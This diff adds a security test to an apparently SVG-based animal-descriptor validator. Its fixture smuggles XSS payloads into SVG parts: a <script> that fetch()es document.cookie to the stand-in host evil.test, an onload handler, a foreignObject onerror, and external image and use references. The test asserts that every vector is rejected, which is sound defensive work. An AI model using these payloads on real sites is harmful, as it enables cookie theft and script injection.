@@ -254,3 +254,47 @@ test("[AD-27] slug + nesting helpers", () => {
   assert.ok(svgNestingDepth("<g><g><g></g></g></g>") === 3);
   assert.ok(svgNestingDepth('<path d="x"/>') === 0);
 });
+
+// A single plausible-looking-but-hostile submission, the kind a real attacker
+// would send: valid metadata, but every part smuggles a payload. This is the
+// proof that the scary path is rejected BEFORE the intake is ever trusted —
+// one fixture covering <script>, onload=, <foreignObject>, an external <image>
+// href, an external <use> ref, and a chrome-targeting class.
+function hostileAnimal() {
+  return {
+    id: "trojan-pup",
+    name: "Definitely A Normal Dog",
+    type: "quadruped",
+    license: "MIT",
+    colors: { "--animal-eye": "40 30% 20%", "--animal-fur": "30 60% 70%" },
+    parts: {
+      body: '<path d="M1,2 L3,4" fill="hsl(var(--animal-fur))"/><script>fetch("https://evil.test/"+document.cookie)</script>',
+      head: '<circle cx="1" cy="2" r="3" fill="hsl(var(--animal-fur))" onload="alert(document.domain)"/>',
+      tail: '<foreignObject width="1" height="1"><body xmlns="http://www.w3.org/1999/xhtml"><img src=x onerror=alert(1)></body></foreignObject>',
+      face: '<image href="https://evil.test/track.gif" width="1" height="1"/>',
+      // a chrome-targeting class AND an external sprite reference
+      frontLeftLeg: '<g class="evcc-card-root hacked"><use href="https://evil.test/sprite.svg#x"/></g>',
+      frontRightLeg: PARTS_Q.frontRightLeg,
+      backLeftLeg: PARTS_Q.backLeftLeg,
+      backRightLeg: PARTS_Q.backRightLeg,
+      eyes: PARTS_Q.eyes,
+    },
+  };
+}
+
+test("[AD-28] HOSTILE fixture — the scary path is rejected, every dangerous vector flagged", () => {
+  const r = validateDescriptor(hostileAnimal());
+  assert.equal(r.ok, false, "a hostile submission must never validate");
+  const joined = r.errors.join("\n");
+  assert.match(joined, /script/i, "<script> must be caught");
+  assert.match(joined, /event handler/i, "onload= must be caught");
+  assert.match(joined, /foreignObject/i, "<foreignObject> must be caught");
+  assert.match(joined, /<image>|load external resources/i, "external <image> must be caught");
+  assert.match(joined, /#fragment/i, "external href/<use> must be caught");
+  // The boring fields (id/name/type/licence/colours) are all valid, so the
+  // ONLY reasons this is rejected are the SVG payloads — proving the SVG gate,
+  // not some unrelated field. Non-allowlisted classes ("evcc-card-root") are
+  // harmless (shadow-DOM encapsulated) and are STRIPPED by the DOMPurify
+  // sanitiser (covered by that module's tests), not a rejection vector here.
+  assert.ok(r.errors.length >= 5, `expected one rejection per hostile part, got ${r.errors.length}`);
+});
